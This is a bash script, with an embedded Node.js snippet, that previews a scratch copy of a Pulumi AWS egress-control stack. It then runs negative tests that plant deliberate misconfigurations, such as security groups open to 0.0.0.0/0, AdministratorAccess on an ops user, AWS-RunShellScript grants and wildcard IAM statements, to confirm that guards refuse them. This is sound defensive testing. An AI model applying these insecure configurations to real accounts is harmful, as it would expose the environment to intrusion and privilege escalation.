#!/usr/bin/env bash
# make preview-scratch [NEGATIVE=...] [EGRESS_MODE=none|firewall]: a full `pulumi preview` of a scratch COPY of infra/
# against the real account, with a throwaway backend, passphrase and stack (D17; T3.2, T3.5; S5; S8 operators).
#
# Why a copy: the agent must never touch Mike's backend, the dev stack or its passphrase, and the negatives edit
# the program. Everything lives under target/image/pulumi-scratch (rebuilt on every run); node_modules is
# symlinked, PULUMI_HOME is private to the scratch dir, and its plugins directory is a real one holding symlinks
# to exactly the two pinned provider plugins (so nothing, not even a .lastused stamp or a plugin install, reaches
# the real ~/.pulumi). A preview creates nothing in AWS (it only reads the caller identity and the AL2023 AMI's
# public SSM parameter). Nothing is written to a log file: the preview's outputs carry the account id, so they go
# to the terminal only (the --json plan is held in a shell variable and fed to the plan check on stdin).
#
# The normal run must succeed, then the plan check (scripts/check-plan.sh, the same one `make deploy` runs; always
# the repo's copy, never the edited scratch copy) must accept the --json plan: exactly the stack inventory per type
# and name (94 in dnsMode none: S3's 16, S5's 38 with the operator role's Deny, S8 operators' 13, the users
# ai-env-deployer and ai-env-ops, the policies ai-env-deployer and ai-env-ops, the six user policy attachments and
# the proxy's three SSM documents, S9's 8, the transcripts bucket with its six settings and the S3 gateway
# endpoint, and S13's 19, the relay; EGRESS_MODE=firewall previews the copy with dnsMode firewall: 99), the pinned
# providers, every egress input and reference, every IAM document (for the caller's account, read once from `aws sts
# get-caller-identity` into a shell variable), who holds which policy, the documents' content (the files) and no
# update of the parameters `ai-env egress` owns. A --json plan has no stack outputs, so the 40 outputs `ai-env infra
# status` reads (S5's 14 egress outputs, S8 operators' 11, S9's 5, S13's 10) are checked in the text preview,
# squidConfSha256 and allowSha256 against the SHA-256 of the planned parameter values, s3EndpointPolicySha256 against
# the canonical hash of the planned endpoint policy, relayPrivateIp and relayPort against the constants, and
# relayArtifactSha256 against the binary previewed (S13: unless RELAY_JSON names an existing relay.json, a planted
# 1 024-byte zero file: a preview uploads nothing, and no cross-build runs). Then the same plan, rewritten in memory into the
# shape `pulumi preview --json` gives for the stack once it exists (every step same, or the VM subnet, VM security
# group and VPC as updates; each id in oldState only, every reference and IAM document resolved for those ids), must
# pass too, also as the deploy that adds the operator role's Deny to it (its create step, everything else same) and
# as the bootstrap (the stack before S8 operators: no user ai-env-deployer in the old state, the 13 creates, the three
# deploy policies replaced for their frozen descriptions, which check-plan allows only then: D12), and twenty-five
# tampered copies of it must be refused: the deploy policy's CreateNetworkConnector condition or the operator role's
# Deny naming the proxy subnet, the Deny also on that create step, where its document left unknown is refused too; the
# connector on the proxy subnet or the proxy's security group, the connector passed another role; ai-env-ops' policy
# granting AWS-RunShellScript, writing every proxy parameter or starting any instance; AdministratorAccess attached to
# ai-env-ops; ai-env-deploy replaced once the deployer exists; an attachment of the deployer deleted; MacRuntimePolicy
# widened (moved here from NEGATIVE=iam-widen: its document names the connector's ARN, unknown in a fresh preview,
# which the plan check accepts there); the aws provider replaced; ai-env-deploy's attachment binding ai-env-ops; an
# attachment of the deployer replaced; the user ai-env-deployer replaced; the bootstrap creating ai-env-deployer before
# its five policies; the status document's content carrying a duplicate key (it parses to the file, but is not the file);
# MacRuntimePolicy bound to ai-env-ops (the daily key would hold the runtime grants); S13: ai-env-ops sending commands to
# the relay instance, or reading its TLS pair; the relay role without NoOtherDecrypt; the relay's artifact parameter
# naming another key than the object's.
# A fresh scratch stack only creates, and a check that saw only creates once
# refused every deploy after the first. The operator role's Deny is proven compared there only: in a fresh preview its
# document is unknown (the subnet and group ids are), which the plan check accepts only while a resource it depends
# on is being created; the ids it is built from are checked by URN (NEGATIVE=miswired). The layers a negative goes
# through, each one alone (the earlier ones disabled in the scratch copy through their scratch:* markers):
#   spec   assertEgressSpec and assertProxyDocuments, before any resource is registered;
#   guard  the resource transform (egress.ts guardEgress), at registration;
#   plan   the plan check over `pulumi preview --json`, after every transform.
# Each negative succeeds only when every expected refusal happens, and prints the diagnostic that fired:
#   no-logging       the `logging` input removed: the typecheck must fail naming it
#   no-logging-cast  removed behind an `as any` cast: the typecheck passes and the SDK's generated constructor
#                    refuses it; then the SDK guard is bypassed too (a raw CustomResource of the same type) and the
#                    provider's Check must refuse it
#   region           aws-native:region eu-west-3 in the scratch stack: the program must throw the pin message
#   vm-sg-open       an egress rule TCP 443 to 0.0.0.0/0 added to the VM security group's spec: spec, guard, plan
#   private-route    a route 0.0.0.0/0 to the IGW added to the VM route table's spec: spec, guard, plan
#   nacl-open        an allow rule added to the VM subnet's NACL in the spec: spec, guard, plan
#   dns-support-on-in-none-mode
#                    enableDnsSupport true in the spec (spec), then in egress.ts's VPC arguments with the spec
#                    intact (guard, plan)
#   stray-rule       resources appended to index.ts: a VPC SG rule (22 from anywhere on the VM group), a legacy
#                    aws.ec2.SecurityGroupRule and an aws.ec2.Route: guard (each), plan (all three)
#   stray-type       resources of types outside the inventory appended to index.ts: a CloudFormation stack (an
#                    AWS::EC2::SecurityGroupEgress template), a Cloud Control resource (an AWS::EC2::Route), an
#                    aws-native ExtensionResource, an SSM association on the proxy, an extra aws provider and a
#                    component resource: guard (each), plan (all)
#   late-transform   a route-adding transform registered at the end of index.ts: refused at registration
#   early-transform  a route-adding transform registered before the guard (the engine does not order transforms):
#                    three runs with the guard, each refused by the guard or the plan; then the plan alone
#   dns-firewall-qtype
#                    dnsMode firewall with qType "A" on the block-all rule (it would block A records only): guard, plan
#   miswired         references the guard cannot compare in a preview (unknown ids): the route tables' associations
#                    swapped, every rule attached to the proxy group, the proxy's ingress referencing itself, the
#                    operator role's Deny built from the proxy subnet's id, ai-env-ops' policy built from the VM
#                    subnet's id instead of the proxy instance's: plan
#   iam-widen        AdministratorAccess in the exec role's managedPolicyArns (guard); then also an inline policy on
#                    the operator role and ssm:* in the proxy's policy: plan (MacRuntimePolicy widened: an existing-
#                    stack copy above)
#   owned-param-reset
#                    the --json plan with an update step on the suspended parameter and a replace step on the extras
#                    one (what any change of theirs but tags would plan): plan (a fresh stack only creates, so the
#                    steps are rewritten in the plan held in memory)
#   identity-widen   S8 operators: AdministratorAccess attached to ai-env-ops instead of its policy (guard);
#                    ai-env-deployer retained on delete, protected, or deleted with another resource (guard, each);
#                    ai-env-deploy's attachment binding ai-env-ops (guard); MacRuntimePolicy on ai-env-ops instead
#                    of ai-env-runtime (guard); an access key, a login profile, an
#                    attachment of AdministratorAccess, a group membership, a PolicyAttachment and a
#                    UserPolicyAttachmentsExclusive of ai-env-ops appended to index.ts (guard, each); all of them with
#                    the deployer's attach condition widened to AdministratorAccess: plan
#   document-widen   S8 operators: a free-form parameter used by the reload document's script (spec, guard, plan); an
#                    {{ssm:…}} reference in the status document's script (spec, guard, plan); a second step in the
#                    patch document (spec, guard, plan); the documents shared with every account (guard, plan); the
#                    status document's script edited (guard, plan)
#   endpoint-on-vm-table
#                    S9: the S3 gateway endpoint on the VM route table (the VMs would reach S3 past squid): plan (the
#                    route tables' ids are unknown in a preview, so the guard cannot compare them)
#   endpoint-policy-widen
#                    S9: the endpoint's policy widened from our bucket's v1/* to the whole bucket: guard, plan
#   bucket-policy-no-vpce
#                    S9: the bucket policy built without the S3 gateway endpoint (another endpoint's id in its
#                    aws:SourceVpce conditions): guard (a known document while the endpoint's id is not), plan (not
#                    built from the endpoint, by URN; not policies.ts's document)
#   relay-sg-open    S13: an ingress TCP 7443 from 0.0.0.0/0 added to the relay group's spec: spec, guard, plan
#   vm-relay-wide    S13: the VM group's rule to the relay widened to the proxy subnet: spec, guard, plan
#   relay-nacl-wide  S13: the NACL's relay egress entry widened to 10.42.0.0/16: spec, guard, plan
#   relay-imds       S13: the relay instance's IMDS hop limit 2: guard, plan
#   relay-eip-elsewhere
#                    S13: the Elastic IP associated with the proxy instance: plan (the ids are unknown in a preview)
#   relay-role-widen S13: the relay role's policy reading every parameter under its prefix (<prefix>/*): plan
#
# Env (set by infra/infra.mk): AI_ENV_REPO_ROOT, REGION, IMAGE_JSON (absolute), RELAY_JSON (absolute), SCRATCH, NEGATIVE,
# EGRESS_MODE.
set -euo pipefail

root=${AI_ENV_REPO_ROOT:?}
: "${REGION:?}"
scratch=${SCRATCH:?}
negative=${NEGATIVE:-}
mode=${EGRESS_MODE:-}
real_image_json=${IMAGE_JSON:?}

negatives="no-logging no-logging-cast region vm-sg-open private-route nacl-open dns-support-on-in-none-mode stray-rule stray-type late-transform early-transform dns-firewall-qtype miswired iam-widen owned-param-reset identity-widen document-widen endpoint-on-vm-table endpoint-policy-widen bucket-policy-no-vpce relay-sg-open vm-relay-wide relay-nacl-wide relay-imds relay-eip-elsewhere relay-role-widen"
case " $negatives " in *" $negative "*) ;; *) test -z "$negative" || { echo "preview-scratch: unknown NEGATIVE=$negative ($negatives)" >&2; exit 2; } ;; esac
case "$mode" in "" | none | firewall) ;; *) echo "preview-scratch: unknown EGRESS_MODE=$mode (none, firewall)" >&2; exit 2 ;; esac
if [ "$mode" = firewall ] && [ -n "$negative" ]; then echo "preview-scratch: EGRESS_MODE=firewall is a positive preview; run the negatives without it" >&2; exit 2; fi
test -d "$root/infra/node_modules" || { echo "preview-scratch: $root/infra/node_modules missing: make infra-install" >&2; exit 1; }
command -v pulumi >/dev/null || { echo "preview-scratch: pulumi not on PATH" >&2; exit 1; }

label="preview-scratch${negative:+ NEGATIVE=$negative}${mode:+ EGRESS_MODE=$mode}"
fail() { echo "$label: $*" >&2; exit 1; }

# ---- the scratch copy ----
rm -rf "${scratch:?}"
mkdir -p "$scratch/state" "$scratch/home"
rsync -a --exclude node_modules --exclude 'Pulumi.*.yaml' --exclude 'config/*.env' --exclude .DS_Store --exclude bin "$root/infra/" "$scratch/infra/"
ln -s "$root/infra/node_modules" "$scratch/infra/node_modules"
plugins="${PULUMI_HOME:-$HOME/.pulumi}/plugins"
mkdir "$scratch/home/plugins"
# Pulumi only takes real directories in plugins/ (a symlinked plugin directory is skipped, then downloaded again),
# so each pinned plugin is a real directory whose files are symlinks to the installed ones.
for p in resource-aws-v7.10.0 resource-aws-native-v1.79.0; do
    test -d "$plugins/$p" && test ! -e "$plugins/$p.partial" && test -x "$plugins/$p/pulumi-${p%-v*}" \
        || fail "plugin $p missing in $plugins (pulumi plugin install resource aws 7.10.0; pulumi plugin install resource aws-native 1.79.0)"
    mkdir "$scratch/home/plugins/$p"
    for f in "$plugins/$p"/*; do ln -s "$f" "$scratch/home/plugins/$p/"; done
done
printf 'BUDGET_EMAIL=example@example.com\nBUDGET_LIMIT_USD=40\n' >"$scratch/infra/config/scratch.env"

(umask 077 && openssl rand -hex 32 >"$scratch/passphrase")
unset PULUMI_CONFIG_PASSPHRASE PULUMI_ACCESS_TOKEN
export PULUMI_CONFIG_PASSPHRASE_FILE="$scratch/passphrase"
export PULUMI_BACKEND_URL="file://$scratch/state"
export PULUMI_HOME="$scratch/home"
export PULUMI_SKIP_UPDATE_CHECK=true

# ---- image.json: the real one when `make image-zip` ran, else a dummy zip (never uploaded: this is a preview) ----
image_json=$real_image_json
if [ ! -f "$image_json" ]; then
    mkdir -p "$scratch/dummy"
    printf 'ai-env scratch preview placeholder (never deployed)\n' >"$scratch/dummy/README"
    (cd "$scratch/dummy" && zip -X -q image.zip README)
    sha=$(shasum -a 256 "$scratch/dummy/image.zip" | cut -d' ' -f1)
    printf '{"zip":"%s","sha256":"%s","key":"ai-env/image-%s.zip","claudeVersion":"0.0.0-scratch","shimVersion":"0.0.0-scratch"}\n' \
        "$scratch/dummy/image.zip" "$sha" "${sha:0:16}" >"$scratch/dummy/image.json"
    image_json="$scratch/dummy/image.json"
    echo "preview-scratch: $real_image_json absent, previewing a dummy zip"
fi
export IMAGE_JSON="$image_json"
# ---- relay.json (S13): the real one when `make relay-artifact` ran, else a planted 1 024-byte zero file (never uploaded) ----
relay_json=${RELAY_JSON:-}
if [ -z "$relay_json" ] || [ ! -f "$relay_json" ]; then
    mkdir -p "$scratch/dummy"
    head -c 1024 /dev/zero >"$scratch/dummy/ai-env-relay"
    sha=$(shasum -a 256 "$scratch/dummy/ai-env-relay" | cut -d' ' -f1)
    printf '{"binary":"%s","sha256":"%s","key":"relay/ai-env-relay-%s","version":"0.0.0-scratch"}\n' "$scratch/dummy/ai-env-relay" "$sha" "${sha:0:16}" \
        >"$scratch/dummy/relay.json"
    relay_json="$scratch/dummy/relay.json"
    echo "preview-scratch: ${RELAY_JSON:-relay.json} absent, previewing a planted relay binary"
fi
export RELAY_JSON="$relay_json"
relay_sha=$(sed -n 's/.*"sha256":"\([0-9a-f]\{64\}\)".*/\1/p' "$relay_json")
test -n "$relay_sha" || fail "$relay_json holds no sha256"

cd "$scratch/infra"
out=$(pulumi stack init scratch --non-interactive 2>&1) || { echo "$out"; fail "pulumi stack init scratch failed"; }
pulumi config set --path 'pulumi:disable-default-providers[0]' '*' --stack scratch

# edit_file <file> <sed expression>...: edit a file of the scratch copy (through its scratch:* markers).
edit_file() {
    local file=$1 args=() e
    shift
    for e in "$@"; do args+=(-e "$e"); done
    sed -i.orig "${args[@]}" "$file" && rm "$file.orig"
}
edit() { edit_file image.ts "$@"; }
# restore <file>...: the scratch copy's files back to the repo's.
restore() { local f; for f in "$@"; do cp "$root/infra/$f" "$f"; done; }
# append <code>: a line of TypeScript at the end of the scratch index.ts (everything it declares is in scope there).
append() { printf '\n// preview-scratch NEGATIVE=%s\n%s\n' "$negative" "$1" >>index.ts; }
preview() { pulumi preview --non-interactive --diff --color never --stack scratch "$@"; }
typecheck() { node_modules/.bin/tsc --noEmit --pretty false 2>&1; }
dns_mode() { sed -n 's/.*"dnsMode": *"\([^"]*\)".*/\1/p' egress-config.json; }
# The plan check of the repo (never the edited copy's), over the scratch copy's config, the plan on stdin. The
# account id only lives in this shell variable (the IAM documents are compared for it).
acct=$(aws sts get-caller-identity --region "$REGION" --query Account --output text)
[[ "$acct" =~ ^[0-9]{12}$ ]] || fail "aws sts get-caller-identity did not answer an account id"
plan_check() {
    PLAN_CHECK_OUT="$scratch/plan-check" "$root/infra/scripts/check-plan.sh" --mode "$(dns_mode)" --account-id "$acct" \
        --egress-config "$scratch/infra/egress-config.json" --image-config "$scratch/infra/image-config.json"
}
# json_plan: the --json plan on stdout (a shell variable for the caller, never a file); the text preview's tail when it fails.
json_plan() {
    local plan
    if plan=$(pulumi preview --non-interactive --json --show-sames --show-reads --stack scratch 2>/dev/null); then printf '%s' "$plan"; return 0; fi
    preview 2>&1 | grep -E 'error|Error' | head -5 >&2 || true
    return 1
}
# Disable a layer in the scratch copy, so the next one alone must refuse (the spec layer: both asserts of index.ts).
no_spec() {
    edit_file index.ts '/scratch:assert$/s/assertEgressSpec(egress, allowText);/void assertEgressSpec;/' \
        '/scratch:assert-documents$/s/assertProxyDocuments(documents);/void assertProxyDocuments;/'
    grep -qF 'void assertEgressSpec; // scratch:assert' index.ts || fail "the scratch:assert marker no longer disables assertEgressSpec"
    grep -qF 'void assertProxyDocuments; // scratch:assert-documents' index.ts || fail "the scratch:assert-documents marker no longer disables assertProxyDocuments"
}
no_guard() {
    edit_file egress.ts '/scratch:guard/s/pulumi.runtime.registerResourceTransform(guard);/void guard;/'
    grep -qF 'void guard; // scratch:guard' egress.ts || fail "the scratch:guard marker no longer disables the resource transform"
}
# first_line <text> <output>: the output from the first occurrence of the text to the end of its line.
first_line() { awk -v t="$1" '{ i = index($0, t); if (i) { print substr($0, i); exit } }' <<<"$2"; }

# expect_refusal <layer> <fixed text>: the typecheck passes (so the refusal is the program's, not tsc's), the
# preview fails, and its output names the expected guard; prints the diagnostic.
expect_refusal() {
    local what=$1 text=$2 out diag
    out=$(typecheck) || { echo "$out"; fail "$what: the typecheck failed (the edit, not the guard, broke the program)"; }
    if out=$(preview 2>&1); then echo "$out"; fail "$what: the preview passed"; fi
    diag=$(first_line "$text" "$out")
    test -n "$diag" || { echo "$out"; fail "$what: the preview failed, but not with \"$text\""; }
    echo "$what: $diag"
}
# expect_plan_refusal <fixed text>...: the typecheck and the preview pass (the earlier layers are disabled or cannot
# see the fault), and the plan check refuses the plan naming every text; prints the diagnostics.
expect_plan_refusal() {
    local out plan t diag
    out=$(typecheck) || { echo "$out"; fail "plan: the typecheck failed"; }
    plan=$(json_plan) || fail "plan: the preview failed, so the plan check was not reached"
    if out=$(plan_check <<<"$plan" 2>&1); then echo "$out"; fail "plan: the plan check passed"; fi
    for t in "$@"; do
        diag=$(first_line "$t" "$out")
        test -n "$diag" || { echo "$out"; fail "plan: the plan check refused, but not with \"$t\""; }
        echo "plan: $diag"
    done
}

# existing_plan <variant>: the --json plan on stdin, rewritten into the shape of the same stack once it exists
# (pulumi 3.266: one step per resource, op same; newState without an id, oldState with it): an id per resource
# (a role's, user's, instance profile's or document's is its name, a managed policy's its ARN, the connector's its ARN,
# the bucket's its name, a subnet's subnet-…, a group's sg-…, the instance's i-…), every unknown input resolved through
# its property dependencies, the IAM documents rendered by policies.ts for those ids (the compiled copy plan_check left
# in $scratch/plan-check). <variant>: none | updated (the VM subnet, the VM security group and the VPC are update
# steps: their ids, too, come from oldState) | operator-new (the deploy that adds the operator role's Deny: its step
# is a create without oldState) | bootstrap (S8 operators' bootstrap, D12: the 13 operator resources created, the
# three deploy policies replaced for their new descriptions, everything else same; no user ai-env-deployer in the old
# state) | deploy-proxy-subnet (the deploy policy names the proxy subnet) | operator-proxy-subnet (the operator role's
# Deny names the proxy subnet) | operator-new-proxy-subnet (so does its create step) | operator-new-unknown (its create
# step's document is unknown, everything it depends on same) | connector-proxy-subnet (the connector's subnet is the
# proxy subnet) | connector-proxy-sg (its security group is the proxy's) | connector-operator-role (it is passed
# another role) | ops-runshell (ai-env-ops may send AWS-RunShellScript) | ops-extras (it may write every proxy
# parameter) | ops-any-instance (it may start and stop any instance) | ops-attach-admin (AdministratorAccess attached to
# ai-env-ops, its dependency kept) | policy-replaced (ai-env-deploy replaced once the deployer exists) |
# deployer-detached (the deployer's attachment of ai-env-ops deleted: a delete step, its old state only) | runtime-widen
# (MacRuntimePolicy with a Widen statement) | provider-replaced (the aws provider replaced) | ops-holds-deploy
# (ai-env-deploy's attachment binds ai-env-ops, by value and by URN) | attachment-replaced (the deployer's attachment
# of its supplement replaced) | deployer-replaced (the user ai-env-deployer replaced, delete before replace) |
# bootstrap-unordered (the bootstrap with ai-env-deployer depending on none of its five policies) |
# document-duplicate-key (the status document's content with a second runCommand key before its own) |
# runtime-policy-on-ops (MacRuntimePolicy binds ai-env-ops, by value and by URN) | S13: ops-relay-commands (ai-env-ops may
# send commands to the relay instance) | ops-reads-tls (it may read the relay's TLS pair) | relay-no-other-decrypt (the
# relay role without NoOtherDecrypt) | artifact-other-key (the artifact parameter names another key than the object's).
# The relay's artifact parameter, unknown in a fresh preview (the bucket and the object are created), is rendered from
# them and $RELAY_JSON, as the program renders it.
existing_plan() {
    ACCOUNT_ID="$acct" node -e '
const fs = require("fs");
const [out, egressConfig, imageConfig, variant] = process.argv.slice(1);
const pol = require(`${out}/policies.js`);
const spec = require(`${out}/egress-spec.js`);
const relaySpec = require(`${out}/relay-spec.js`);
const relayJson = JSON.parse(fs.readFileSync(process.env.RELAY_JSON, "utf-8"));
const cfg = spec.loadEgressConfig(egressConfig);
const img = JSON.parse(fs.readFileSync(imageConfig, "utf-8"));
const plan = JSON.parse(fs.readFileSync(0, "utf-8"));
const acct = process.env.ACCOUNT_ID;
const UNKNOWN = "04da6b54-80e4-46f7-96ec-b56ff0331ba9";
const name = (s) => s.urn.split("::").pop();
const type = (s) => (s.newState || s.oldState).type;
const ids = new Map();
let n = 0;
for (const s of plan.steps) {
    const t = type(s), i = (s.newState || {}).inputs || {}, k = n++;
    const hex = (p) => `${p}-0${k.toString(16).padStart(16, "0")}`;
    ids.set(s.urn, ["aws:iam/role:Role", "aws:iam/user:User", "aws:iam/instanceProfile:InstanceProfile", "aws:ssm/document:Document"].includes(t) ? i.name
        : t === "aws:iam/policy:Policy" ? `arn:aws:iam::${acct}:policy/${i.name}`
        : t === "aws-native:lambda:NetworkConnector" ? `arn:aws:lambda:${pol.REGION}:${acct}:network-connector:nc-${k.toString(16).padStart(17, "0")}`
        : t === "aws:s3/bucket:Bucket" ? i.bucket
        : t === "aws:ec2/subnet:Subnet" ? hex("subnet") : t === "aws:ec2/securityGroup:SecurityGroup" ? hex("sg") : t === "aws:ec2/vpc:Vpc" ? hex("vpc")
        : t === "aws:ec2/instance:Instance" ? hex("i") : t === "aws:ec2/vpcEndpoint:VpcEndpoint" ? hex("vpce")
        : t.startsWith("pulumi:providers:") ? `00000000-0000-4000-8000-${k.toString(16).padStart(12, "0")}` : hex("id"));
}
const byName = (t, nm) => plan.steps.find((s) => type(s) === t && name(s) === nm);
const vmSubnet = ids.get(byName("aws:ec2/subnet:Subnet", "ai-env-egress-vms").urn);
const proxySubnet = ids.get(byName("aws:ec2/subnet:Subnet", "ai-env-egress-proxy").urn);
const vmSg = ids.get(byName("aws:ec2/securityGroup:SecurityGroup", cfg.vmSecurityGroupName).urn);
const proxySg = ids.get(byName("aws:ec2/securityGroup:SecurityGroup", cfg.proxySecurityGroupName).urn);
const updated = new Set([byName("aws:ec2/subnet:Subnet", "ai-env-egress-vms").urn, byName("aws:ec2/securityGroup:SecurityGroup", cfg.vmSecurityGroupName).urn, byName("aws:ec2/vpc:Vpc", "ai-env-egress").urn]);
const bucket = ids.get(byName("aws:s3/bucket:Bucket", pol.BUCKET_PREFIX).urn);
// S9: the id of the S3 gateway endpoint, which the policy of the transcripts bucket names.
const s3EndpointId = ids.get(byName("aws:ec2/vpcEndpoint:VpcEndpoint", spec.NET.s3Endpoint).urn);
// The connector ARN (the runtime policy, S7 D5) and the proxy instance id (the ops policy, S8 operators).
const connectorArn = ids.get(byName("aws-native:lambda:NetworkConnector", cfg.connectorName).urn);
const proxyInstanceId = ids.get(byName("aws:ec2/instance:Instance", "ai-env-egress-proxy").urn);
// S13: the id of the relay instance (RelayInstance of the ops policy).
const relayInstanceId = ids.get(byName("aws:ec2/instance:Instance", spec.NET.relayInstance).urn);
const names = (subnet) => ({ accountId: acct, region: pol.REGION, bucket, imageName: img.imageName, logGroup: img.logGroup,
    egress: { ...spec.egressNames(cfg), vmSubnetId: subnet, vmSecurityGroupId: vmSg, connectorArn, proxyInstanceId, relayInstanceId },
    transcriptsBucket: pol.transcriptsBucketName(acct), s3EndpointId });
const docs = (subnet) => new Map(pol.allPolicies(names(subnet)).map((d) => [d.name, JSON.stringify(d.document)]));
const good = docs(vmSubnet), bad = docs(proxySubnet);
// Which document each IAM input is (print-policies names).
const doc = { "aws:iam/role:Role": { "ai-env-image-build": "build-trust", "ai-env-vm-exec": "execution-trust", [cfg.proxyRoleName]: "proxy-trust", [cfg.operatorRoleName]: "operator-trust",
        [pol.RELAY_ROLE_NAME]: "relay-trust" },
    "aws:iam/rolePolicy:RolePolicy": { "ai-env-image-build": "build", "ai-env-vm-exec": "execution", [cfg.proxyRoleName]: "proxy", [cfg.operatorRoleName]: "operator",
        [pol.RELAY_ROLE_NAME]: "relay" },
    "aws:iam/userPolicy:UserPolicy": { MacRuntimePolicy: "runtime" },
    "aws:iam/policy:Policy": { "ai-env-deploy": "deploy", "ai-env-deploy-egress": "deploy-egress", "ai-env-deploy-dns": "deploy-dns", "ai-env-deployer": "deployer", "ai-env-ops": "ops" },
    // S9: the two resource policies (their `policy` input, as for a role policy).
    "aws:ec2/vpcEndpoint:VpcEndpoint": { [spec.NET.s3Endpoint]: "s3-endpoint" }, "aws:s3/bucketPolicy:BucketPolicy": { [pol.TRANSCRIPTS_RESOURCE]: "transcripts-bucket" } };
// The tampered documents: [which document, the edit of its parsed JSON].
const statement = (d, sid) => d.Statement.find((x) => x.Sid === sid);
const edits = {
    "ops-runshell": ["ops", (d) => statement(d, "ProxyCommands").Resource.push(`arn:aws:ssm:${pol.REGION}::document/AWS-RunShellScript`)],
    "ops-extras": ["ops", (d) => { statement(d, "WriteSuspendedParameter").Resource = [pol.proxyParameterArn(names(vmSubnet))]; }],
    "ops-any-instance": ["ops", (d) => { statement(d, "ProxyInstance").Resource = [`arn:aws:ec2:${pol.REGION}:${acct}:instance/*`]; }],
    "runtime-widen": ["runtime", (d) => d.Statement.push({ Sid: "Widen", Effect: "Allow", Action: ["*"], Resource: ["*"] })],
    "ops-relay-commands": ["ops", (d) => statement(d, "ProxyCommands").Resource.push(pol.relayInstanceArn(names(vmSubnet)))],
    "ops-reads-tls": ["ops", (d) => statement(d, "ReadRelayParameters").Resource.push(pol.relayParameterArn(names(vmSubnet), pol.RELAY_TLS))],
    "relay-no-other-decrypt": ["relay", (d) => { d.Statement = d.Statement.filter((x) => x.Sid !== "NoOtherDecrypt"); }],
};
// S13: the value of the artifact parameter, as relay.ts renders it from the bucket, the key of the object and relay.json.
const relayObjectKey = byName("aws:s3/bucketObjectv2:BucketObjectv2", spec.NET.relayArtifact).newState.inputs.key;
const artifactValue = () => variant === "artifact-other-key"
    ? relaySpec.relayArtifactValue({ bucket, key: "relay/ai-env-relay-ffffffffffffffff", sha256: "f".repeat(64), version: relayJson.version })
    : relaySpec.relayArtifactValue({ bucket, key: relayObjectKey, sha256: relayJson.sha256, version: relayJson.version });
const render = (which, text) => {
    const e = edits[variant];
    if (e === undefined || e[0] !== which) return text;
    const d = JSON.parse(text);
    e[1](d);
    return JSON.stringify(d);
};
// resolve(value, deps, key): every unknown in value, the id of its one dependency (under a connector list key, the
// dependency of that kind); with several, a placeholder (a by-value check against it can only refuse, never pass).
const resolve = (v, deps, key) => {
    if (Array.isArray(v)) return v.map((x) => resolve(x, deps, key));
    if (v !== null && typeof v === "object") return Object.fromEntries(Object.entries(v).map(([k, x]) => [k, resolve(x, deps, k)]));
    if (v !== UNKNOWN) return v;
    const want = key === "subnetIds" ? "aws:ec2/subnet:Subnet" : key === "securityGroupIds" ? "aws:ec2/securityGroup:SecurityGroup" : undefined;
    const d = want ? deps.filter((u) => u.split("::").slice(-2, -1)[0] === want) : deps;
    return d.length === 1 ? ids.get(d[0]) : `resolved-${key}`;
};
for (const s of plan.steps) {
    const st = s.newState;
    if (!st) continue;
    const inputs = {};
    for (const [k, v] of Object.entries(st.inputs || {})) {
        const which = (doc[st.type] || {})[name(s)];
        const iamKey = st.type === "aws:iam/role:Role" ? "assumeRolePolicy" : "policy";
        const tampered = (variant === "deploy-proxy-subnet" && which === "deploy") || ((variant === "operator-proxy-subnet" || variant === "operator-new-proxy-subnet") && which === "operator");
        inputs[k] = which && k === iamKey ? render(which, (tampered ? bad : good).get(which) ?? v) : resolve(v, (st.propertyDependencies || {})[k] || [], k);
    }
    if (st.type === "aws:ssm/parameter:Parameter" && name(s) === spec.NET.relayArtifactParameter) inputs.insecureValue = artifactValue();
    if (st.type === "aws-native:lambda:NetworkConnector") {
        // An ARN cannot be resolved from its two dependencies (the role and its attachment): it is the ARN of the operator role.
        inputs.operatorRole = pol.roleArn(names(vmSubnet), variant === "connector-operator-role" ? "ai-env-vm-exec" : cfg.operatorRoleName);
        if (variant === "connector-proxy-subnet") inputs.configuration.vpcEgressConfiguration.subnetIds = [proxySubnet];
        if (variant === "connector-proxy-sg") inputs.configuration.vpcEgressConfiguration.securityGroupIds = [proxySg];
    }
    // ops-attach-admin: the ops user holds AdministratorAccess instead of its policy (the dependency on it kept).
    if (variant === "ops-attach-admin" && st.type === "aws:iam/userPolicyAttachment:UserPolicyAttachment" && name(s) === pol.attachmentName(pol.OPS_USER_NAME, pol.OPS_POLICY_NAME)) {
        inputs.policyArn = "arn:aws:iam::aws:policy/AdministratorAccess";
    }
    // ops-holds-deploy: the attachment named for the deployer and ai-env-deploy binds the ops user instead, by value and
    // by URN (a swapped user map in iam.ts): the daily key would deploy.
    const opsHoldsDeploy = variant === "ops-holds-deploy" && st.type === "aws:iam/userPolicyAttachment:UserPolicyAttachment"
        && name(s) === pol.attachmentName(pol.DEPLOYER_USER_NAME, pol.DEPLOY_POLICY_NAME);
    // runtime-policy-on-ops: MacRuntimePolicy binds the ops user instead, by value and by URN (a swapped user in iam.ts):
    // the daily key would hold the runtime grants (RunMicrovm, the shell token, PassRole on the execution role).
    const runtimeOnOps = variant === "runtime-policy-on-ops" && st.type === "aws:iam/userPolicy:UserPolicy" && name(s) === pol.RUNTIME_POLICY_NAME;
    const toOps = opsHoldsDeploy || runtimeOnOps;
    if (toOps) inputs.user = pol.OPS_USER_NAME;
    const kept = { ...st, inputs };
    delete kept.id;
    if (toOps) kept.propertyDependencies = { ...(st.propertyDependencies || {}), user: [byName("aws:iam/user:User", pol.OPS_USER_NAME).urn] };
    s.op = variant === "updated" && updated.has(s.urn) ? "update" : "same";
    // policy-replaced: a policy the deployer holds is replaced once the deployer exists (D12 refuses it).
    if (variant === "policy-replaced" && st.type === "aws:iam/policy:Policy" && name(s) === pol.DEPLOY_POLICY_NAME) s.op = "replace";
    // attachment-replaced: an attachment of the deployer is replaced once the deployer exists (D12 refuses it too).
    if (variant === "attachment-replaced" && st.type === "aws:iam/userPolicyAttachment:UserPolicyAttachment" && name(s) === pol.attachmentName(pol.DEPLOYER_USER_NAME, pol.DEPLOYER_POLICY_NAME)) s.op = "replace";
    s.newState = kept;
    s.oldState = st.type === "pulumi:pulumi:Stack" ? { ...kept } : { ...kept, id: ids.get(s.urn), outputs: { ...inputs, id: ids.get(s.urn) } };
    if (st.provider) {
        const purn = st.provider.slice(0, st.provider.lastIndexOf("::"));
        s.provider = s.newState.provider = s.oldState.provider = `${purn}::${ids.get(purn)}`;
    }
    // operator-new*: the stack exists, the Deny does not yet (the deploy that adds it): its step is a create.
    if (variant.startsWith("operator-new") && st.type === "aws:iam/rolePolicy:RolePolicy" && name(s) === cfg.operatorRoleName) {
        s.op = "create";
        delete s.oldState;
    }
}
const left = [];
